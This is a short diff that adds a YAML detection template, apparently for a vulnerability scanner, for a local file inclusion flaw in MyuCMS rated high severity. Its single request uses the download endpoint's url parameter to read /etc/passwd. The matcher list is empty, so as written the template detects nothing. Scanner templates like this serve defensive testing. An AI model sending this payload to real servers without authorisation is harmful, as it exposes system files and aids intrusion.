@@ -1,0 +1,16 @@
+id: myucms-lfr
+brief:
+    title: MyuCMS - Local File Inclusion
+    by: princechaddha
+    level: high
+    about: MyuCMS is vulnerable to local file inclusion.
+    label:
+        - myucms
+        - lfi
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/index.php/bbs/index/download?url=/etc/passwd&name=1.txt&local=1'
+      signs: []
